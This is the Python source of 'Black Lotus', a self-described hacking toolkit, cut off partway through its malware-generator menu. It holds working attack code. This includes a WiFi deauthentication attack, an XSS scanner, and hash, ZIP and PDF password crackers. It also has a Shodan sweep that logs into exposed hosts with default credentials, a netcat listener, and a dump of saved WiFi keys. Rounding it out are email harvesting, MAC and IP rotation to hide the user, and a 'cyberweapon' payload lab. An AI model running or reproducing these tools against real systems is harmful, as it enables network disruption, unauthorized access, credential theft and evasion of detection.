#!/usr/bin/env python3
#Black Lotus v2-dev-
#Copyright of Th3 Jes7er

#----------------------------------------------------------------------------------------------------------------------
import os
from getpass import getpass
import time
import sys
def login():
    os.system('cls||clear')
    usr = input("\033[37m Username\033[5;37m: \033[0;31m")
    if usr =="black":
        pas = getpass(prompt="\033[37m Password\033[5;37m: \033[0;31m")
        if pas == "black":
            os.system('cls||clear')
            login = False

        else:
            print("\033[31mPassword is invalid")
            print("\033[37m ")
            time.sleep(1)
            os.system('cls||clear')
            sys.exit()
    else:
        print("\033[31mUsername is false or does not exist")
        print("\033[37m ")
        time.sleep(1)
        os.system('cls||clear')
        sys.exit()

login()

#----------------------------------------------------------------------------------------------------------------------
print("\033[37mLoading \033[31mBlack Lotus \n For Better experience set terminal to fullscreen\033[37m")

#----------------------------------------------------------------------------------------------------------------------

import time
import threading
import socket
import uuid
from pexpect import pxssh
import sys
import subprocess
from datetime import datetime
try:
	import phonenumbers
	from phonenumbers import geocoder, carrier
except:
	os.system('pip install phonenumbers')
	import phonenumbers
	from phonenumbers import geocoder, carrier
import glob
import paramiko
import webbrowser
from PIL import Image
from PIL.ExifTags import TAGS
import re
try:
	from requests_html import HTMLSession
except:
	os.system('pip install requests_html')
	from requests_html import HTMLSession
import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import colorama
from colorama import init
init()
try:
	import pikepdf
except:
	os.system('pip install pikepdf')
	import pikepdf
from tqdm import tqdm
import zipfile
from tkinter import *
from scapy.all import *
#----------------------------------------------------------------------------------------------------------------------

def loading():
    import time
    import sys
    animation = ["[\033[31m###         \033[37m]","[\033[31m####        \033[37m]", "[\033[31m#####       \033[37m]", "[\033[31m######      \033[37m]", "[\033[31m#######     \033[37m]", "[\033[31m########    \033[37m]", "[\033[31m#########   \033[37m]", "[\033[31m##########  \033[37m]", "[\033[31m########### \033[37m]", "[\033[31m############\033[37m]"]
    for i in range(len(animation)):
        time.sleep(0.2)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()

    print("\n")
    print("\033[37m ")
loading()

#----------------------------------------------------------------------------------------------------------------------
#ESC [ 31 m      # red
#ESC [ 32 m      # green
#ESC [ 33 m      # yellow
#ESC [ 34 m      # blue
#ESC [ 35 m      # magenta
#ESC [ 36 m      # cyan
#ESC [ 37 m      # white
#ESC [ 39 m      # reset

#----------------------------------------------------------------------------------------------------------------------

def public_ip_addr():
    import re
    import json
    from urllib.request import urlopen

    url = 'http://ipinfo.io/json'
    response = urlopen(url)
    data = json.load(response)

    ip=data['ip']
    org=data['org']
    city = data['city']
    country=data['country']
    region=data['region']
    location=data['loc']
    hostname=data['hostname']
    print('\033[32mPublic IP Address Details\n \033[37m')
    print('\033[37mIP: \033[32m', ip, '\033[37m\nRegion: \033[32m', region, '\033[37m\nCountry: \033[32m',country, '\033[37m\nCity: \033[32m',city, '\033[37m\nOrg: \033[32m', org, '\033[37m ')
    print('\033[37mLocation: \033[32m', location)
    print('\033[37mHostname: \033[32m', hostname)
    print("\n\033[37m")

#----------------------------------------------------------------------------------------------------------------------

def host_details():
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    time.sleep(0.2)
    print("\n\033[36mHost Details")
    print("\033[37m============")
    print("\033[37m Host: \033[31m", host)
    print("\033[37m Local IP:\033[31m ", ip)
    print("\033[37m MAC: \033[31m", end="")
    print (':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
    for ele in range(0,8*6,8)][::-1]))
    print("\033[37m============")
    public_ip_addr()

#----------------------------------------------------------------------------------------------------------------------

def photo():
    imagename = input("\033[37mEnter image path \033[31m>\033[37m ")
    image = Image.open(imagename)
    print("       ")
    print("-------------------------")
    exifdata = image.getexif()
    for tag_id in exifdata:
        tag = TAGS.get(tag_id, tag_id)
        data = exifdata.get(tag_id)
        if isinstance(data, bytes):
            data = data.decode()
        print(f"{tag:25}: {data}")
        print("    ")
        os.system('sudo exiftool' + imagename)

#----------------------------------------------------------------------------------------------------------------------

def phone_lookup():
    p = input("\033[37mEnter Phone Number (with carrier number, like +30) \033[31m>\033[37m ")
    phoneNumber = phonenumbers.parse(p)
    Carrier = carrier.name_for_number(phoneNumber, 'en')
    Region = geocoder.description_for_number(phoneNumber, 'en')
    print("\n\033[37m====================")
    print("\033[34mPhone Number details\033[37m")
    print("\033[37m====================")
    print("\033[37m# Phone number: \033[31m", p)
    print("\033[37m# Carrier: \033[31m", Carrier)
    print("\033[37m# Region: \033[31m", Region)
    print("\033[37m     ")
    print("\033[31mDo you want to check the Phonebook for Greek Numbers?")
    a = input("\033[31mThis may contain information about Name, Address and more (y/n)\033[37m ")
    b = input("Open in megalodon's browser ? (y/n) ")
    if b == "y":
        a = "y"
    elif b == "n":
        print("\033[36mLink: \033[31mhttps://www.11888.gr/antistrofh-anazhthsh-me-arithmo-thlefwnou/ \033[37m")
        a = "n"
    else:
        print("Get out of here")
    if a == "y":
        import tkinterweb
        import tkinter as tk
        root = tk.Tk()
        root.title("Black Lotus Browser: Greek PhoneBook Searcher")
        root.geometry("900x450+200+150")
        frame = tkinterweb.HtmlFrame(root)
        frame.load_website('https://www.11888.gr/antistrofh-anazhthsh-me-arithmo-thlefwnou/')
        frame.pack(fill="both", expand=True)
        root.mainloop()
    else:
        print("  ")

#----------------------------------------------------------------------------------------------------------------------

def listener():
    b = input("\033[37mEnter Port \033[31m>\033[37m")
    os.system("nc -lvnp " + b)

#----------------------------------------------------------------------------------------------------------------------

def xss():
    def get_all_forms(url):
        soup = bs(requests.get(url).content, "html.parser")
        return soup.find_all("form")

    def get_form_details(form):
        details = {}
        action = form.attrs.get("action").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def submit_form(form_details, url, value):
        target_url = urljoin(url, form_details["action"])
        inputs = form_details["inputs"]
        data = {}
        for input in inputs:
            if input["type"] == "text" or input["type"] == "search":
                input["value"] = value
            input_name = input.get("name")
            input_value = input.get("value")
            if input_name and input_value:
                data[input_name] = input_value
        if form_details["method"] == "post":
            return requests.post(target_url, data=data)
        else:
            return requests.get(target_url, params=data)

    def scan_xss(url):
        forms = get_all_forms(url)
        print(f"\033[37m[\033[31m+\033[37m] Detected {len(forms)} forms on \033[31m{url}\033[37m.")
        js_script = "<script>alert('Black Lotus')</script>"
        is_vulnerable = False
        for form in forms:
            form_details = get_form_details(form)
            content = submit_form(form_details, url, js_script).content.decode()
            if js_script in content:
                print(f"\033[37m[\033[31m+\033[37m] XSS Detected on \033[31m{url}\033[37m")
                print(f"\033[37m[\033[31m*\033[37m] Form details:\033[31m")
                pprint(form_details)
                is_vulnerable = True
        return is_vulnerable
        print("\033[37m   ")

    if __name__ == "__main__":
        url = input("\033[37mEnter URL \033[31m>\033[37m ")
        print(scan_xss(url))
        print("\033[37m   ")

#----------------------------------------------------------------------------------------------------------------------

def atom():
    #!/usr/bin/env python3

    import subprocess
    import re
    import csv
    import os
    import time
    import shutil
    from datetime import datetime

    active_wireless_networks = []
    def check_for_essid(essid, lst):
        check_status = True

        # If no ESSIDs in list add the row
        if len(lst) == 0:
            return check_status

        for item in lst:
            if essid in item["ESSID"]:
                check_status = False

        return check_status

    print("""\033[37m



     _______                   /__/        \033[35m█████╗ ████████╗ ██████╗ ███╗   ███╗\033[37m
    |.-----.|             ,---[___]*      \033[35m██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║\033[37m
    ||     ||            /    \033[33mprinter\033[37m     \033[35m███████║   ██║   ██║   ██║██╔████╔██║\033[37m
    ||_____||     _____ /        ____     \033[35m██╔══██║   ██║   ██║   ██║██║╚██╔╝██║\033[37m
    |o_____+|    [o_+_+]--------[=i==]    \033[35m██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║\033[37m
          |_______| \033[32mwlan0\033[37m        drive    \033[35m╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝\033[37m
                                                Wifi \033[31mKiller\033[37m
    """)

    if not 'SUDO_UID' in os.environ.keys():
        print("Run this program with sudo.")

    for file_name in os.listdir():
        if ".csv" in file_name:
            print("There shouldn't be any .csv files in your directory. We found .csv files in your directory.")
            directory = os.getcwd()
            try:
                os.mkdir(directory + "/backup/")
            except:
                print("Backup folder exists.")
            timestamp = datetime.now()
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

    wlan_pattern = re.compile("^wlan[0-9]+")
    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

    if len(check_wifi_result) == 0:
        print("Please connect a WiFi controller and try again.")
        loading()

    print("The following WiFi interfaces are available:")
    for index, item in enumerate(check_wifi_result):
        print(f"{index} - {item}")

    while True:
        wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
        try:
            if check_wifi_result[int(wifi_interface_choice)]:
                break
        except:
            print("Please enter a number that corresponds with the choices.")

    hacknic = check_wifi_result[int(wifi_interface_choice)]

    print("\033[37mWiFi adapter connected!\nNow let's kill conflicting processes:\033[37m")

    kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

    print("Putting Wifi adapter into monitored mode:")
    put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

    discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        while True:
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                    fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                    if ".csv" in file_name:
                        with open(file_name) as csv_h:
                            csv_h.seek(0)
                            csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                            for row in csv_reader:
                                if row["BSSID"] == "BSSID":
                                    pass
                                elif row["BSSID"] == "Station MAC":
                                    break
                                elif check_for_essid(row["ESSID"], active_wireless_networks):
                                    active_wireless_networks.append(row)

            print("Scanning. Press Ctrl+C when you want to select the target wireless network.\n")
            print("+---+---------------------+------------+------------------------------+ ")
            print("|No |BSSID                |Channel     |ESSID                         |")
            print("+---+---------------------+------------+------------------------------+")
            for index, item in enumerate(active_wireless_networks):
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nReady to attack")

    while True:
        choice = input("\033[37mBlack Lotus(\033[31mattack\033[37m)\033[31m>\033[37m ")
        try:
            if active_wireless_networks[int(choice)]:
                break
        except:
            print("Please try again.")

    hackbssid = active_wireless_networks[int(choice)]["BSSID"]
    hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

    subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])


    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        while True:
            print("Deauthenticating clients, press ctrl-c to stop")
    except KeyboardInterrupt:
        print("Stop monitor mode")
        subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
        print("\033[31mExiting ATOM!!\033[37m")


#----------------------------------------------------------------------------------------------------------------------

total_urls_visited =0
def links():
    colorama.init()
    GREEN = colorama.Fore.GREEN
    GRAY = colorama.Fore.LIGHTBLACK_EX
    RESET = colorama.Fore.RESET
    YELLOW = colorama.Fore.YELLOW
    internal_urls = set()
    external_urls = set()

    def is_valid(url):
        parsed = urlparse(url)
        return bool(parsed.netloc) and bool(parsed.scheme)

    def get_all_website_links(url):
        urls = set()
        domain_name = urlparse(url).netloc
        soup = BeautifulSoup(requests.get(url).content, "html.parser")

        for a_tag in soup.findAll("a"):
            href = a_tag.attrs.get("href")
            if href == "" or href is None:
                continue
            href = urljoin(url, href)
            parsed_href = urlparse(href)
            href = parsed_href.scheme + "://" + parsed_href.netloc + parsed_href.path
            if not is_valid(href):
                continue
            if href in internal_urls:
                continue
            if domain_name not in href:
                if href not in external_urls:
                    print(f"{GRAY}[!] External link: {href}{RESET}")
                    external_urls.add(href)
                continue
            print(f"{GREEN}[*] Internal link: {href}{RESET}")
            urls.add(href)
            internal_urls.add(href)
        return urls

    def crawl(url, max_urls=30):

        global total_urls_visited
        total_urls_visited += 1
        print(f"{YELLOW}[*] Crawling: {url}{RESET}")
        links = get_all_website_links(url)
        for link in links:
            if total_urls_visited > max_urls:
                break
            crawl(link, max_urls=max_urls)

    if __name__ == "__main__":
        crawl(input("\033[37m Enter URL \033[36m>\033[37m "))
        print("[+] Total Internal links:", len(internal_urls))
        print("[+] Total External links:", len(external_urls))
        print("[+] Total URLs:", len(external_urls) + len(internal_urls))

#----------------------------------------------------------------------------------------------------------------------

def subdomain():
    domain = input("\033[37mBlack Lotus(\033[36mSubdomain/URL\033[37m) \033[31m>\033[37m ")
    dir = input("\033[37mBlack Lotus(\033[36mSubdomain/file\033[37m) \033[31m>\033[37m ")
    print("\n\033[36mResults will be saved as 'discovered_subdomains.txt'\033[37m")
    file = open(dir)
    content = file.read()
    subdomains = content.splitlines()
    discovered_subdomains = []
    for subdomain in subdomains:
        url = f"http://{subdomain}.{domain}"
        try:
            requests.get(url)
        except requests.ConnectionError:
            pass
        else:
            print("\033[37m[\033[31m+\033[37m] Discovered subdomain:\033[33m", url)
            discovered_subdomains.append(url)
            with open("discovered_subdomains.txt", "w") as f:
                for subdomain in discovered_subdomains:
                    print(subdomain, file=f)
#----------------------------------------------------------------------------------------------------------------------

def detect_arp():
    import os
    try:
        from scapy.all import Ether, ARP, srp, sniff, conf
        import scapy.all as scapy
    except:
        os.system("pip3 install scrapy ")
        from scapy.all import Ether, ARP, srp, sniff, conf
        import scapy.all as scapy

    def mac(ipadd):
        arp_request = scapy.ARP(pdst=ipadd)
        br = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_req_br = br / arp_request
        list_1 = scapy.srp(arp_req_br, timeout=5,
                        verbose=False)[0]
        return list_1[0][1].hwsrc


    def sniff(interface):
        scapy.sniff(iface=interface, store=False,
                    prn=process_sniffed_packet)


    def process_sniffed_packet(packet):
        if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 2:
            originalmac = mac(packet[scapy.ARP].psrc)
            responsemac = packet[scapy.ARP].hwsrc
    os.system('cls||clear')
    print("""\033[31m
  █████╗ ██████╗ ██████╗     ███████╗██████╗  ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝
███████║██████╔╝██████╔╝    ███████╗██████╔╝██║   ██║██║   ██║█████╗
██╔══██║██╔══██╗██╔═══╝     ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝
██║  ██║██║  ██║██║         ███████║██║     ╚██████╔╝╚██████╔╝██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝

█████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
███████║   ██║      ██║   ███████║██║     █████╔╝
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

██████╗ ███████╗████████╗███████╗ ██████╗████████╗ ██████╗ ██████╗
██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
██║  ██║█████╗     ██║   █████╗  ██║        ██║   ██║   ██║██████╔╝
██║  ██║██╔══╝     ██║   ██╔══╝  ██║        ██║   ██║   ██║██╔══██╗
██████╔╝███████╗   ██║   ███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║
╚═════╝ ╚══════╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
    By Black Lotus \033[37m""")
    a = input("Enter interface to sniff \033[36m|>\033[37m ")
    print("Starting sniffing process...")
    time.sleep(1)
    print("Detection sequence initialised....\n press Ctrl + C to stop")
    sniff(a)

#----------------------------------------------------------------------------------------------------------------------

def hash_crack():
    os.system('cls||clear')
    import hashlib
    print("""\033[31m

          ▒▒░░░░░░░░░░░░█████           \033[37m██╗  ██╗ █████╗ ███████╗██╗  ██╗    ██╗      █████╗ ██████╗\033[31m
          ▒▒░░            ▒▒█           \033[37m██║  ██║██╔══██╗██╔════╝██║  ██║    ██║     ██╔══██╗██╔══██╗\033[31m
          ▒▒░░            ▒▒█           \033[37m███████║███████║███████╗███████║    ██║     ███████║██████╔╝\033[31m
          ▒▒░░            ▒▒█           \033[37m██╔══██║██╔══██║╚════██║██╔══██║    ██║     ██╔══██║██╔══██╗\033[31m
          ▒▒░░            ▒▒█           \033[37m██║  ██║██║  ██║███████║██║  ██║    ███████╗██║  ██║██████╔╝\033[31m
    ▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░    \033[37m╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═════╝\033[31m
    ▒▒▒▒░░▒▒░░░░░░░░░░░░░░░░░░░░░░░░  \033[31m+\033[37m| \033[34mAlgorithm \033[37m|\033[31m+\033[31m
    ▒▒▒▒░░▒▒░░░░░░░░░░▒▒░░░░░░░░░░░░  \033[37m| \033[31mA\033[37m) md5      |\033[31m
    ▒▒▒▒░░▒▒░░░░░░▒▒▒▒▒▒▒▒░░░░░░░░░░  \033[37m| \033[31mB\033[37m) sha1     |\033[31m      \033[31m+\033[37m--| \033[31mHelp Menu \033[37m|---------------------------\033[31m+\033[31m
    ▒▒▒▒░░▒▒░░░░░░▒▒▒▒▒▒░░░░░░░░░░░░  \033[37m| \033[31mC\033[37m) sha224   |\033[31m      \033[37m| \033[36mencryption\033[37m: Encrypt a text with a        \033[37m|\033[31m
    ▒▒▒▒░░▒▒░░░░░░░░░░░░░░░░░░░░░░░░  \033[37m| \033[31mD\033[37m) sha256   |\033[31m      \033[37m| hashing algorithm (5 available)          \033[37m|\033[31m
    ▒▒▒▒░░▒▒░░░░░░░░░░░░░░░░░░░░░░░░  \033[37m| \033[31mE\033[37m) sha384   |\033[31m      \033[37m| \033[36mdecryption\033[37m: Decrypt a hash using         \033[37m|\033[31m
    ▒▒▒▒░░▒▒░░      ░░░░  ░░      ▒▒  \033[37m| \033[31mF\033[37m) sha512   |\033[31m      \033[37m| a wordlist and the hashing algorithm     \033[37m|\033[31m
    ▒▒▒▒░░▒▒          ░░          ▒▒  \033[31m+\033[37m-------------\033[31m+\033[31m      \033[31m+\033[37m------------------------------------------\033[31m+\033[31m
    ▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░                                            \033[37m""")

    hash_method = True
    def encrypt():
        une = input("Text to encrypt \033[31m>\033[37m ")
        algorithm1 = input("Algorithm \033[31m>\033[37m ")
        message = une.encode('utf-8')
        if algorithm1 == "A":
            h = hashlib.md5(message)
        elif algorithm1 == "B":
            h = hashlib.sha1(message)
        elif algorithm1 == "C":
            h = hashlib.sha224(message)
        elif algorithm1 == "D":
            h = hashlib.sha256(message)
        elif algorithm1 == "E":
            h = hashlib.sha384(message)
        elif algorithm1 == "F":
            h = hashlib.sha512(message)
        else:
            print("This algorithm '", algorithm1, "' is not recognized or not supported")
            return(encrypt())
        print("Original text '", une, "', ", "hashed text '", h.hexdigest(), "' ")

    def decrypt():
        pass_found = 0
        input_hash = input("Enter the hashed password: ")
        algorithm1 = input("Algorithm \033[31m>\033[37m ")
        pass_doc = input("\nEnter passwords filename including path(root / home/): ")

        try:
            pass_file = open(pass_doc, 'r')
        except:
            print("Error:")
            print(pass_doc, "is not found.\nPlease give the path of file correctly.")
            quit()

        for word in pass_file:
            enc_word = word.encode('utf-8')
            if algorithm1 == "A":
                hash_word = hashlib.md5(enc_word.strip())
            elif algorithm1 == "B":
                hash_word = hashlib.sha1(enc_word.strip())
            elif algorithm1 == "C":
                hash_word = hashlib.sha224(enc_word.strip())
            elif algorithm1 == "D":
                hash_word = hashlib.sha256(enc_word.strip())
            elif algorithm1 == "E":
                hash_word = hashlib.sha384(enc_word.strip())
            elif algorithm1 == "F":
                hash_word = hashlib.sha512(enc_word.strip())
            else:
                print("This algorithm '", algorithm1, "' is not recognized or not supported")
            digest = hash_word.hexdigest()

            if digest == input_hash:
                print("\033[32mPassword found!\033[37m\nThe password is: \033[36m", word, " \033[37m")
                pass_found = 1
                break

        if not pass_found:
            print("Password is not found in the", pass_doc, "file")
            print('\n')

    while hash_method:
        a = input("\n\033[31mBlack Lotus(\033[31mencryption/decryption\033[37m) \033[31m>\033[37m ")
        if a == "encryption":
            encrypt()
        elif a == "decryption":
            decrypt()
        elif a == "help":
            print("""
    \033[31m+\033[37m--| \033[31mHelp Menu \033[37m|-----------------------------------------------------------\033[31m+\033[37m
    \033[37m| \033[31mencryption\033[37m: Encrypt a text with a hashing algorithm (5 available)        \033[37m|\033[37m
    \033[37m| \033[31mdecryption\033[37m: Decrypt a hash using a wordlist and the hashing algorithm    \033[37m|\033[37m
    \033[31m+\033[37m--------------------------------------------------------------------------\033[31m+\033[31m
    To exit type 'exit'
            \033[37m""")
        elif a == "exit":
            hash_method = False
        else:
          print(a, "not recognized as internal or external command")
          print("Type 'help' to reveal the help menu")


#----------------------------------------------------------------------------------------------------------------------

def zip_crack():
    wordlist = input("\033[37mBlack Lotus(\033[31mZIP/Wordlist\033[37m) \033[31m>\033[37m ")
    zip_file = input("\033[37mBlack Lotus(\033[31mZIP/file\033[37m) \033[31m>\033[37m ")
    zip_file = zipfile.ZipFile(zip_file)
    n_words = len(list(open(wordlist, "rb")))
    print("\033[37mTotal passwords for testing: \033[36m", n_words)
    print("\033[37m    ")
    with open(wordlist, "rb") as wordlist:
        for word in tqdm(wordlist, total=n_words, unit="word"):
            try:
                zip_file.extractall(pwd=word.strip())
            except:
                continue
            else:
                print("\033[37m[\033[36m+\033[37m] Password found: \033[36m", word.decode().strip())
                print("\033[37m")
                exit(0)
    print("\033[37m[\033[33m!\033[37m] Password not found, try other wordlist.")

#----------------------------------------------------------------------------------------------------------------------

def pdf_crack():
    passlist = input("\033[31mBlack Lotus(\033[31mPDF/Wordlist\033[37m) \033[31m>\033[37m ")
    pdf_file = input("\033[31mBlack Lotus(\033[31mPDF/File\033[37m) \033[31m>\033[37m ")
    passwords = [ line.strip() for line in open(passlist) ]
    for password in tqdm(passwords, "Decrypting PDF"):
        try:
            with pikepdf.open(pdf_file, password=password) as pdf:
                print("\033[37m[\033[31m+\033[37m] Password found:\033[31m", password)
                print("\033[37m   ")
                break
        except pikepdf._qpdf.PasswordError as e:
            continue

#----------------------------------------------------------------------------------------------------------------------

def shodan():
    import shodan
    import time
    import requests
    import re
    #api key
    SHODAN_API_KEY = input("\033[31mBlackLotus(\033[31mSHODAN API KEY\033[37m) \033[31m>\033[37m ")
    api = shodan.Shodan(SHODAN_API_KEY)

    def request_page_from_shodan(query, page=1):
        while True:
            try:
                instances = api.search(query, page=page)
                return instances
            except shodan.APIError as e:
                print(f"Error: {e}")
                time.sleep(5)

    def has_valid_credentials(instance):
        sess = requests.Session()
        proto = ('ssl' in instance) and 'https' or 'http'
        try:
            res = sess.get(f"{proto}://{instance['ip_str']}:{instance['port']}/login.php", verify=False)
        except requests.exceptions.ConnectionError:
            return False
        if res.status_code != 200:
            print("[\033[31m-\033[37m] Got HTTP status code {res.status_code}, expected 200")
            return False
        # search the CSRF token using regex
        token = re.search(r"user_token' value='([0-9a-f]+)'", res.text).group(1)
        res = sess.post(
            f"{proto}://{instance['ip_str']}:{instance['port']}/login.php",
            f"username=admin&password=password&user_token={token}&Login=Login",
            allow_redirects=False,
            verify=False,
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )
        if res.status_code == 302 and res.headers['Location'] == 'index.php':
            # Redirects to index.php, we expect an authentication success
            return True
        else:
            return False

    def process_page(page):
        result = []
        for instance in page['matches']:
            if has_valid_credentials(instance):
                print(f"[\033[31m+\033[37m] valid credentials at : {instance['ip_str']}:{instance['port']}")
                result.append(instance)
        return result

    # searches on shodan using the given query, and iterates over each page of the results
    def query_shodan(query):
        print("[\033[34m*\033[37m] querying the first page")
        first_page = request_page_from_shodan(query)
        total = first_page['total']
        already_processed = len(first_page['matches'])
        result = process_page(first_page)
        page = 2
        while already_processed < total:
            # break just in your testing, API queries have monthly limits
            break
            print("querying page {page}")
            page = request_page_from_shodan(query, page=page)
            already_processed += len(page['matches'])
            result += process_page(page)
            page += 1
        return result

    # search for DVWA instances
    res = query_shodan('title:dvwa')
    print(res)

#----------------------------------------------------------------------------------------------------------------------

def ghost_anon():
    ghost_invinsible = True
    os.system("cls || clear")
    os.system("sudo anonsurf start")
    while ghost_invinsible:
        os.system("sudo macchanger -r eth0||sudo macchanger --random enp0s25")
        os.system("cls||clear")
        os.system("sudo anonsurf change")
        os.system("cls||clear")
        print("""\033[37m

      .'``'.      ...
     :x   x`....'`  ; \033[31mGhost mode enabled!!!\033[37m
     `.           :'  Your IP and MAC address
       `':          `.    are changing every 30 seconds...
         `:.          `.
          : `.         `.
         `..'`...       `.
                 `...     `.
                     ``...  `.
                          `````.
        """)
        print("\n\033[31mTo stop press 'CTRL + C'\033[39m")
        time.sleep(30)

#----------------------------------------------------------------------------------------------------------------------

def emails():
    url = input("\033[31mBlack Lotus(\033[31mEmail/URL\033[37m) \033[31m>\033[37m ")
    EMAIL_REGEX = r"""(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9]))\.){3}(?:(2(5[0-5]|[0-4][0-9])|1[0-9][0-9]|[1-9]?[0-9])|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])"""
    print("This may require to auto-install Chromium for the email harvesting")
    session = HTMLSession()
    r = session.get(url)
    r.html.render()
    print("+-----------------------+")
    print("|     EMAILS            |")
    for re_match in re.finditer(EMAIL_REGEX, r.html.raw_html.decode()):
        print("+-----------------------+")
        print("|", re_match.group())

#----------------------------------------------------------------------------------------------------------------------

def known_password_finder():
    import subprocess

    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            print ("{:<30}|  {:<}".format(i, results[0]))
        except IndexError:
            print ("{:<30}|  {:<}".format(i, ""))
    input("")

#----------------------------------------------------------------------------------------------------------------------

def viking_malware():
    import os
    os.system("cls||clear")
    print("\033[31mBLACK LOTUS EXCLUSIVE CYBERWEAPON")
    print(r"""
            ,            ██▒   █▓ ██▓ ██ ▄█▀ ██▓ ███▄    █   ▄████
       ,    |\,__       ▓██░   █▒▓██▒ ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
       |\   \/   `.      ▓██  █▒░▒██▒▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
       \ `-.:.     `\     ▒██ █░░░██░▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
        `-.__ `\=====|     ▒▀█░  ░██░▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
           /=`'/   ^_\     ░ ▐░  ░▓  ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒
         .'   /\   .=)     ░ ░░   ▒ ░░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░
      .-'  .'|  '-(/_|       ░░   ▒ ░░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░
    .'  __(  \  .'`           ░   ░  ░  ░    ░           ░       ░
   /_.'`  `.  |`             ░
            \ |            The Ultimate Malware Development Toolkit
             |/            Type 'Lab' to reveal the malware panel
             """)
    mallab = True
    while mallab:
        b = input("\033[31mBlack Lotus\033[37m(\033[31mViking\033[37m) \033[31m>\033[37m ")
        if b == "Lab":
            os.system("cls||clear")
            payload = "NOT SET"
            payload_extension = "NOT SET"
            payload_os = "NOT SET"
            local_ip = "NOT SET"
            lport = "NOT SET"
            payload_name = "NOT SET"
            payload_location = "NOT SET"
            link_true_false="False"

            def help():
                os.system('cls||clear')
                print("""\033[37m
 ============================== \033[31mMalware Lab Panel\033[37m ==============================
 \033[31mCore Commands\033[37m
 set payload 'number'   Set the specific payload to generate, #Example: set payload 1
 set lhost     Set custom local ip that you want the payload to listen
                |_You can see your local ip by typing 'lhost'
 lhost         Auto set lhost of your machine
